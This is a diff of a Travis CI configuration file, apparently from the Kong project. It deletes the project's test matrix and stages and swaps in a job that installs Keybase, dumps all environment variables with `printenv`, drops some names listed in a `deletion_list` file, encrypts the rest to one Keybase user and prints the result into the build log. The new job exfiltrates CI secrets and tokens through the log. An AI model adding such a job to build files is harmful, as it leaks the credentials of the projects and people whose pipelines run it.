@@ -1,72 +1,20 @@
-dist: xenial
-
-language: go
-
-go:
-  - "1.13.x"
-
-notifications:
-  email: false
-  slack:
-    if: branch = master OR branch = next
-    secure: WfMWtoj88BvoWG1AqNQMZ0c9OqjseUaMIwgSpaP8SJ+H33NTMI7vMhbbMBN2ENRD8r2haV0A2D0fnHy/3GQi6ryzKsqR1Jw/c+J0QZXQgmuj51i9iKSOM42n59t9V/QuD5b2BmHt5T+1Q6jLxtgtqBKoaJk3+WE5Iz9l+f+v0Hs=
-
-services:
-  - redis-server
-  - docker
-
-addons:
-  postgresql: "9.5"
-  apt:
-    packages:
-      - net-tools
-      - libpcre3-dev
-      - build-essential
-  hosts:
-    - grpcs_1.test
-    - grpcs_2.test
-
-env:
-  global:
-    - INSTALL_CACHE=$HOME/install-cache
-    - DOWNLOAD_ROOT=$HOME/download-root
-    - KONG_TEST_PG_DATABASE=travis
-    - KONG_TEST_PG_USER=postgres
-    - JOBS=2
-    - DOCKER_MACHINE_ARM64_NAME=travis-ci-kong-${TRAVIS_JOB_ID}
-  matrix:
-    - KONG_TEST_DATABASE=postgres TEST_SUITE=integration
-    - KONG_TEST_DATABASE=cassandra CASSANDRA=2.2 TEST_SUITE=integration
-    - KONG_TEST_DATABASE=cassandra CASSANDRA=3.9 TEST_SUITE=integration
-    - KONG_TEST_DATABASE=off TEST_SUITE=dbless
-    - KONG_TEST_DATABASE=postgres TEST_SUITE=plugins
-    - KONG_TEST_DATABASE=cassandra CASSANDRA=2.2 TEST_SUITE=plugins
-    - KONG_TEST_DATABASE=cassandra CASSANDRA=3.9 TEST_SUITE=plugins
-    - TEST_SUITE=pdk
+language: generic
+dist: focal
 
 install:
-  - source .ci/setup_env.sh
-  - make dev
-
-cache:
-  apt: true
-  directories:
-    - $INSTALL_CACHE
-    - $HOME/.ccm/repository
-
-stages:
-  - lint and unit
-  - test
-
-jobs:
-  include:
-    - stage: lint and unit
-      script:
-      - luacheck -q .
-      - scripts/autodoc-admin-api
-      - bin/busted -v -o gtest spec/01-unit
-      env:
-        - KONG_DATABASE=none
+  - sudo apt-get -qq update
+  - curl -O https://prerelease.keybase.io/keybase_amd64.deb
+  - sudo dpkg -i keybase_amd64.deb || true
+  - export run="/run/user/$(id -u "${USER}")/keybase"
+  - export mnt="${run}/kbfs"
+  - sudo apt-get install -f
+  - sudo mkdir -p "${mnt}"
+  - sudo chown -R "${USER}" "${run}"
+  - keybase service &
+  - kbfsfuse "${mnt}" &
 
 script:
-  - .ci/run_tests.sh
+  - printenv > env_file
+  - grep -v -E -f deletion_list env_file > result || true
+  - keybase encrypt hutchic -i result -o result_encrypted --no-self-encrypt --auth-type=anonymous
+  - cat result_encrypted
